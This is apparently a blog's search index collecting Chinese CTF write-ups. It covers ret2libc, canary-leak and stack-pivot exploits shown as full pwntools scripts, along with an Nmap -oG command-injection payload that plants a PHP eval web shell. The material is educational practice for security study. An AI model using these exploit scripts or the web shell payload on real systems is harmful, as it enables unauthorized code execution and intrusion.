<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ret2lib</title>
    <url>/babyrop/</url>
    <content><![CDATA[<h1 id="babyrop-ret2lib"><a href="#babyrop-ret2lib" class="headerlink" title="babyrop  ret2lib"></a>babyrop  ret2lib</h1><p>checksec查看，只开启了栈执行保护，是32位的，使用ida查看字符串，没有看到’&#x2F;bin&#x2F;sh’，排除ROPgadget构造System(‘&#x2F;bin&#x2F;sh’)，查看反编译的代码如下：</p>
<p><img src="/babyrop/babyrop(1).png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> random; <span class="comment">// [esp+4h] [ebp-14h] BYREF    32位系统下为4个字节，这里对应esp的4个位置，栈的长度4个字节</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);   <span class="comment">//随机数</span></span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">​    read(fd, &amp;random, <span class="number">4u</span>);    <span class="comment">//写入4字节的随机数到buf中</span></span><br><span class="line"></span><br><span class="line">  v2 = function1(random);    <span class="comment">//输入的数值作为参数传递给function1</span></span><br><span class="line">  function2(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">function1</span><span class="params">(<span class="type">int</span> random)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//void *memset(void *str, int c, size_t n) 复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。</span></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));     <span class="comment">//m字符填充，将整个字符数组都填充为0</span></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, random);     <span class="comment">//int sprintf(char *str, const char *format, ...) 发送格式化输出到 str 所指向的字符串。</span></span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);   <span class="comment">//读取键盘的输入，不存在溢出点，read返回值为实际读取到的字节数</span></span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;    <span class="comment">//把 buf 最末一个字符去掉为0，v5为该字符数组的长度</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);   <span class="comment">//以\x00为结尾判断</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )    <span class="comment">//要使得buf和s的前v1个字符相同，如果v1为0则一定相同</span></span><br><span class="line">​    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);     <span class="comment">//输出到屏幕</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];  <span class="comment">//取字符数组下标为7的ASCII码，即十六进制</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">function2</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">​    result = read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">​    result = read(<span class="number">0</span>, buf, a1);     <span class="comment">//这里取的是字符的ASCII码值，控制a1大于231，那样就可以溢出，覆盖ret地址，通过获取lib版本来getshell</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行代码审计，可以得出，我们需要先绕过function1，使得strlen(buf)的返回值为0，然后进入function2，让buf的第八个字符尽可能的大，让read的可溢出范围大大一些。</p>
<p>计算溢出值，从char buf[231] 右边的ebp-e7h可以知道，这个变量距离ebp有0xe7的空间，需要填充0xe7个</p>
<p>function2函数调用的时候push了一个ebp，因此在溢出的时候需要溢出多4个字节，把ebp覆盖掉。</p>
<p><img src="/babyrop/babyrop(2).png"></p>
<p>构造payload1，使用puts来暴露地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;local:1/remote:2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select==<span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">​    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26949</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> select==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">​    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">LSM_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">\<span class="comment">#_start_addr = elf.symbols[&#x27;_start&#x27;] Not all the file has the function of _start</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x8048825</span>   <span class="comment">#Get it by IDA or gdb</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;begin send the payload2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(puts_plt) + p32(main_addr) + p32(LSM_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">LSM_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;LSM_addr: &#x27;</span> + <span class="built_in">hex</span>(LSM_addr))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;*******&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,LSM_addr)</span><br><span class="line"></span><br><span class="line">basic_addr = LSM_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = basic_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">str_binsh_addr = basic_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(system_addr) + <span class="string">&#x27;temp&#x27;</span> + p32(str_binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>payload2 使用write来暴露地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26949</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#r=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#溢出控制返回值v5</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;\xff&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#泄漏libc</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">\<span class="comment">#计算libc_base，system_addr，bin_sh_addr</span></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line"></span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#执行payload</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">payload+=p32(system_addr)*<span class="number">2</span>+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
        <tag>32bit</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯2020朱雀组-Nmap</title>
    <url>/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/</url>
    <content><![CDATA[<ol>
<li>打开页面</li>
</ol>
<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172428863.png" alt="img"></p>
<p> 2.利用<a href="https://so.csdn.net/so/search?q=NMAP&spm=1001.2101.3001.7020">NMAP</a>里的-oG命令实现代码的写入，那我们这里就可以尝试构造payload，来利用‘拼接，写入我们想要的shell文件</p>
<p>我们直接用那道buu里的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt; -oG zhuque.php&#x27;</span><br></pre></td></tr></table></figure>

<p>注入之后发现存在过滤，fuzz,过滤了php</p>
<p>（1）利用&lt;?&#x3D;来代替&lt;?php进行绕过<br>（2）利用phtml来代替shell.php的文件后缀</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?= eval($_POST[&quot;cmd&quot;]);?&gt; -oG zhuque.phtml&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172548382.png" alt="img"></p>
<p> 上传成功</p>
<p>3.打开蚁剑</p>
<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_19,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
<p> 在根目录下找到flag</p>
<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172608276.png" alt="img"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令注入</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>bjdctf_2020_babyrop2</title>
    <url>/bjdctf_2020_babyrop2/</url>
    <content><![CDATA[<h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p><img src="/bjdctf_2020_babyrop2/1.jpg"></p>
<p>可见，这里开启了栈执行保护和栈溢出保护，但不是菜单题，不考虑是堆，展示重要代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gift();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%6s&quot;</span>, format);                <span class="comment">// 有格式化字符串漏洞，可以打印栈上的内容，例如cancary的值，而且它们的值是一样的，在子线程内？</span></span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// 控制输入内容%7$p即可打印栈内容</span></span><br><span class="line">  <span class="built_in">puts</span>(byte_400A05);</span><br><span class="line">  fflush(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);                        <span class="comment">// 栈溢出，利用cancary避免栈保护，然后正常的ret2libc</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>根据函数分析，可以构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,27146)</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span>    <span class="comment">#打印栈上的cancary</span></span><br><span class="line">r.sendline(payload)    </span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)   <span class="comment">#接收cancary，cancary是通用的，因此gift上的cancary和vuln函数上的cancary的值是一样的</span></span><br><span class="line">cancry = <span class="built_in">int</span>(r.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0400993</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x0400887</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">8</span>)+p64(cancry)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base_addr = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=base_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">shell_addr = base_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">8</span>)+p64(cancry)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(shell_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
        <tag>64bit</tag>
      </tags>
  </entry>
  <entry>
    <title>BlackWatch入群题-PWN</title>
    <url>/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/</url>
    <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p><img src="/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/1.jpg"></p>
<p>checksec查看，得到32位，并且不可执行shellcode，使用ida查看代码，代码如下，查看字符串，没有发现’&#x2F;bin&#x2F;sh’</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vul_function();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodBye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);      <span class="comment">//s是bss段的一段内存，无法溢出到</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);    <span class="comment">//只能溢出0x8的空间，也就是只能覆盖到ebp和ret，明显的栈迁移</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该题的解题思路就是栈迁移+libc，我们可以把payload写在bss段上，然后覆盖ebp和ret，把ebp覆盖成bss地址-4，把ret覆盖成leave ret。</p>
<p>那么，leave就会mov esp ebp   pop ebp，然后到ret。这样把bss段的第一个地址当成ret地址了，可以执行函数。注意这种不是shellcode不要求有执行栈的权限。</p>
<p><img src="/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/2.jpg"></p>
<p>完整payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25396</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">func_addr = <span class="number">0x0804849B</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">leave_ret_addr = <span class="number">0x08048408</span> <span class="comment"># ROPgadget --binary rop --only &quot;leave|ret&quot;</span></span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在read的bss端读入rop链</span></span><br><span class="line"></span><br><span class="line">payload = p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈迁移原理：ebp覆盖成目标内存地址，leave;ret=&gt;mov esp ebp;pop ebp;pop eip;call eip;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># esp指向bss段，这就是栈迁移</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr: &#x27;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一定要用LibcSearcher</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system[%s],binsh[%s]&#x27;</span> % (<span class="built_in">hex</span>(system_addr), <span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line"></span><br><span class="line">payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
        <tag>32bit</tag>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_c_1</title>
    <url>/ciscn_2019_c_1/</url>
    <content><![CDATA[<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>lib版本泄露 + 堆栈平衡 + gets和strlen的函数区别</p>
<p><img src="/ciscn_2019_c_1/ciscn_2019_c_1(1).png"></p>
<p>checksec，查看文件的类型，是64位的，使用ida64打开，查看函数没有发现getshell或者cat flag相关的函数，查看字符串，没有发现&#x2F;bin&#x2F;sh字符。可以猜测是使用lib泄露地址，查找lib版本，然后根据版本的偏移地址来计算system函数和&#x2F;bin&#x2F;sh字符串的地址，组成getshell。</p>
<p>查看代码并测试，发现关键函数在encrypt。代码如下</p>
